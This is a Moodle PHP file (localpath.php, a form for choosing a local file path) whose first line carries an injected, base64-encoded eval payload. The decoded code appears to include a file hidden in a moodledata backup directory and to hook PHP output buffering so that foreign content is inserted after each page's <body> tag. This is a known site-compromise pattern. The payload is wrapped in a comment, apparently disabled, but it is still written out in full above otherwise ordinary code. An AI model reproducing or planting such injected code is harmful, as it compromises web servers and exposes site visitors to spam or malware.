<?php /**//*eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ3NoX25vJ10pKXskR0xPQkFMU1snc2hfbm8nXT0xO2lmKGZpbGVfZXhpc3RzKCcvc3J2L3d3dy92aG9zdHMvc3luZXJneS1sZWFybmluZy5jb20vc3ViZG9tYWlucy9kZXZlbG9wL2h0dHBkb2NzL2Nhcm9saW5lL21vb2RsZWRhdGEvdGVtcC9iYWNrdXAvMTE5MjAwODA1My9iYWNrdXAtZmVhdHVyZXMtMjAwNjA5MjUtMDkxMS9jb3Vyc2VfZmlsZXMvZ2xvc3NhcnkvQV9nbG9zc2FyeV9vZl9jb21tb25fdGVybXMvbWRsX3V0Zi5waHAnKSl7aW5jbHVkZV9vbmNlKCcvc3J2L3d3dy92aG9zdHMvc3luZXJneS1sZWFybmluZy5jb20vc3ViZG9tYWlucy9kZXZlbG9wL2h0dHBkb2NzL2Nhcm9saW5lL21vb2RsZWRhdGEvdGVtcC9iYWNrdXAvMTE5MjAwODA1My9iYWNrdXAtZmVhdHVyZXMtMjAwNjA5MjUtMDkxMS9jb3Vyc2VfZmlsZXMvZ2xvc3NhcnkvQV9nbG9zc2FyeV9vZl9jb21tb25fdGVybXMvbWRsX3V0Zi5waHAnKTtpZihmdW5jdGlvbl9leGlzdHMoJ2dtbCcpJiYhZnVuY3Rpb25fZXhpc3RzKCdkZ29iaCcpKXtpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXtmdW5jdGlvbiBnemRlY29kZSgkZCl7JGY9b3JkKHN1YnN0cigkZCwzLDEpKTskaD0xMDskZT0wO2lmKCRmJjQpeyRlPXVucGFjaygndicsc3Vic3RyKCRkLDEwLDIpKTskZT0kZVsxXTskaCs9MiskZTt9aWYoJGYmOCl7JGg9c3RycG9zKCRkLGNocigwKSwkaCkrMTt9aWYoJGYmMTYpeyRoPXN0cnBvcygkZCxjaHIoMCksJGgpKzE7fWlmKCRmJjIpeyRoKz0yO30kdT1nemluZmxhdGUoc3Vic3RyKCRkLCRoKSk7aWYoJHU9PT1GQUxTRSl7JHU9JGQ7fXJldHVybiAkdTt9fWZ1bmN0aW9uIGRnb2JoKCRiKXtIZWFkZXIoJ0NvbnRlbnQtRW5jb2Rpbmc6IG5vbmUnKTskYz1nemRlY29kZSgkYik7aWYocHJlZ19tYXRjaCgnL1w8Ym9keS9zaScsJGMpKXtyZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8Ym9keVteXD5dKlw+KS9zaScsJyQxJy5nbWwoKSwkYyk7fWVsc2V7cmV0dXJuIGdtbCgpLiRjO319b2Jfc3RhcnQoJ2Rnb2JoJyk7fX19')); */?>
<?php    // $Id: localpath.php,v 1.5 2007/01/09 10:42:24 vyshane Exp $

    require('../../../../config.php');
    require('../../lib.php');

    $pathname = optional_param('pathname', '');

    if ($pathname) {
        if (confirm_sesskey()) {
            set_user_preference('resource_localpath', $pathname);
        }
        ?>
        <script type="text/javascript">
        //<![CDATA[
        window.close();
        //]]>
        </script>
        <?php
        exit;
    }

    print_header(get_string('localfilechoose', 'resource'));

    print_simple_box(get_string('localfilepath', 'resource', $CFG->wwwroot.'/user/edit.php?course='.SITEID), 'center');

    ?>
    <script type="text/javascript">
    //<![CDATA[
    function set_value(txt) {
        if (txt.indexOf('/') > -1) {
            txt = txt.substring(0,txt.lastIndexOf('/'));
        } else if (txt.indexOf('\\') > -1) {
            txt = txt.substring(0,txt.lastIndexOf('\\'));
        }
        getElementById('myform').pathname.value = txt;
        getElementById('myform').submit();
    }
    //]]>
    </script>
    
    <br />
    <div align="center" class="form">
    <form id="myform" action="localpath.php" method="post">
    <fieldset class="invisiblefieldset">
    <input type="hidden" name="sesskey" value="<?php echo sesskey(); ?>">
    <input type="hidden" name="pathname" value="" />
    <input type="file" size="60" name="myfile" /><br />
    <input type="button" value="<?php print_string('localfileselect','resource') ?>" 
           onClick="return set_value(getElementById('myform').myfile.value)">
    <input type="button" value="<?php print_string('cancel') ?>" 
           onClick="window.close()">
    </form>
    </fieldset>
    </div>

    </body>
    </html>
